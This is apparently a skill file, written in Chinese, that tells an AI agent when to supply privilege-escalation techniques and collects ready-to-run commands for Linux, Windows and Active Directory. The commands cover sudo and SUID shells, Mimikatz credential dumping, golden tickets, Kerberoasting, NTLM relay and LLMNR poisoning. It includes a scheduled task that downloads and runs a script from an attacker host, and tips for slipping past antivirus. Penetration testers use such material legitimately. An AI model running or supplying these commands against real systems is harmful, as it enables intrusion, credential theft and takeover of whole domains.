---
name: Privilege Escalation Methods
description: This skill should be used when the user asks to "escalate privileges", "get root access", "become administrator", "privesc techniques", "abuse sudo", "exploit SUID binaries", "Kerberoasting", "pass-the-ticket", "token impersonation", or needs guidance on post-exploitation privilege escalation for Linux or Windows systems.
metadata:
  author: zebbern
  version: "1.1"
---
# 提权方法

## 目的

提供将权限从低权限用户提升到被攻陷的 Linux 和 Windows 系统上的 root/管理员访问权限的综合技术。对于渗透测试后渗透阶段和红队操作必不可少。

## 输入/前提条件

- 目标系统上的初始低权限 shell 访问
- Kali Linux 或其他渗透测试发行版
- 工具：Mimikatz、PowerView、PowerUpSQL、Responder、Impacket、Rubeus
- 对 Windows/Linux 权限模型的理解
- 对于 AD 攻击：域用户凭据以及到域控制器（DC）的网络访问

## 输出/交付物

- root 或管理员 shell 访问权限
- 提取的凭据和哈希
- 持久化访问机制
- 域攻陷（针对 AD 环境）

---

## 核心技术

### Linux 提权

#### 1. 滥用 Sudo 二进制文件

利用 GTFOBins 技术利用配置不当的 sudo 权限：

```bash
# Check sudo permissions
sudo -l

# Exploit common binaries
sudo vim -c ':!/bin/bash'
sudo find /etc/passwd -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python -c 'import pty;pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo less /etc/hosts    # then type: !bash
sudo man man            # then type: !bash
sudo env /bin/bash
```

#### 2. 滥用计划任务（Cron）

```bash
# Find writable cron scripts
ls -la /etc/cron*
cat /etc/crontab

# Inject payload into writable script
echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh

# Wait for execution, then:
/bin/bash -p
```

#### 3. 滥用 Capabilities 能力

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Python with cap_setuid
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Tar with cap_dac_read_search (read any file)
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf key.tar
```

#### 4. NFS Root Squashing 攻击

```bash
# Check for NFS shares
showmount -e <victim_ip>

# Mount and exploit no_root_squash
mkdir /tmp/mount
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount
cd /tmp/mount
cp /bin/bash .
chmod +s bash
```

#### 5. 利用以 Root 身份运行的 MySQL

```bash
# If MySQL runs as root
mysql -u root -p
\! chmod +s /bin/bash
exit
/bin/bash -p
```

---

### Windows 提权

#### 1. 令牌模拟

```powershell
# Using SweetPotato (SeImpersonatePrivilege)
execute-assembly sweetpotato.exe -p beacon.exe

# Using SharpImpersonation
SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser
```

#### 2. 服务滥用

```powershell
# Using PowerUp
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'
Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\user1'
```

#### 3. 滥用 SeBackupPrivilege

```powershell
import-module .\SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

#### 4. 滥用 SeLoadDriverPrivilege

```powershell
# Load vulnerable Capcom driver
.\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
.\ExploitCapcom.exe
```

#### 5. 滥用 GPO

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
  --Author DOMAIN\<USER> --Command "cmd.exe" `
  --Arguments "/c net user Administrator Password!@# /domain" `
  --GPOName "ADDITIONAL DC CONFIGURATION"
```

---

### Active Directory 攻击

#### 1. Kerberoasting

```bash
# Using Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.100 -request

# Using CrackMapExec
crackmapexec ldap 10.0.2.11 -u 'user' -p 'pass' --kdcHost 10.0.2.11 --kerberoast output.txt
```

#### 2. AS-REP Roasting

```powershell
.\Rubeus.exe asreproast
```

#### 3. 黄金票据

```powershell
# DCSync to get krbtgt hash
mimikatz# lsadump::dcsync /user:krbtgt

# Create golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:domain.local `
  /sid:S-1-5-21-... /rc4:<NTLM_HASH> /id:500
```

#### 4. 票据传递

```powershell
.\Rubeus.exe asktgt /user:USER$ /rc4:<NTLM_HASH> /ptt
klist  # Verify ticket
```

#### 5. 结合计划任务的黄金票据

```powershell
# 1. Elevate and dump credentials
mimikatz# token::elevate
mimikatz# vault::cred /patch
mimikatz# lsadump::lsa /patch

# 2. Create golden ticket
mimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `
  /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi

# 3. Create scheduled task
schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
  /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
schtasks /run /s DOMAIN /TN "enterprise"
```

---

### 凭据收割

#### LLMNR 投毒

```bash
# Start Responder
responder -I eth1 -v

# Create malicious shortcut (Book.url)
[InternetShortcut]
URL=https://facebook.com
IconIndex=0
IconFile=\\attacker_ip\not_found.ico
```

#### NTLM 中继

```bash
responder -I eth1 -v
ntlmrelayx.py -tf targets.txt -smb2support
```

#### 使用 VSS 转储凭据

```powershell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

---

## 快速参考

| 技术 | 操作系统 | 需要域 | 工具 |
|-----------|-----|-----------------|------|
| Sudo 二进制文件滥用 | Linux | 否 | GTFOBins |
| Cron 计划任务利用 | Linux | 否 | 手动 |
| Capability 滥用 | Linux | 否 | getcap |
| NFS no_root_squash | Linux | 否 | mount |
| 令牌模拟 | Windows | 否 | SweetPotato |
| 服务滥用 | Windows | 否 | PowerUp |
| Kerberoasting | Windows | 是 | Rubeus/Impacket |
| AS-REP Roasting | Windows | 是 | Rubeus |
| 黄金票据 | Windows | 是 | Mimikatz |
| 票据传递 | Windows | 是 | Rubeus |
| DCSync | Windows | 是 | Mimikatz |
| LLMNR 投毒 | Windows | 是 | Responder |

---

## 约束

**必须：**
- 在尝试提权前先获得初始 shell 访问
- 在选择技术前验证目标操作系统和环境
- 针对域提权与本地提权使用合适的工具

**禁止：**
- 不得在未经授权的情况下在生产系统上尝试这些技术
- 不得在未经客户批准的情况下留下持久化机制
- 不得忽视检测机制（EDR、SIEM）

**建议：**
- 在利用之前进行彻底的枚举
- 记录所有成功的提权路径
- 交战结束后清理痕迹

---

## 示例

### 示例 1：Linux 从 Sudo 提升到 Root

```bash
# Check sudo permissions
$ sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/vim

# Exploit vim
$ sudo vim -c ':!/bin/bash'
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 示例 2：Windows Kerberoasting

```bash
# Request service tickets
$ GetUserSPNs.py domain.local/jsmith:Password123 -dc-ip 10.10.10.1 -request

# Crack with hashcat
$ hashcat -m 13100 hashes.txt rockyou.txt
```

---

## 故障排除

| 问题 | 解决方案 |
|-------|----------|
| sudo -l 需要密码 | 尝试其他枚举方法（SUID、cron、capabilities） |
| Mimikatz 被杀毒软件拦截 | 使用 Invoke-Mimikatz 或 SafetyKatz |
| Kerberoasting 未返回任何哈希 | 检查是否存在具有 SPN 的服务账户 |
| 令牌模拟失败 | 验证是否存在 SeImpersonatePrivilege |
| NFS 挂载失败 | 检查 NFS 版本兼容性（vers=2,3,4） |

---

## 其他资源

如需详细的枚举脚本，可以使用：
- **LinPEAS**：Linux 提权枚举
- **WinPEAS**：Windows 提权枚举
- **BloodHound**：Active Directory 攻击路径映射
- **GTFOBins**：Unix 二进制文件利用参考
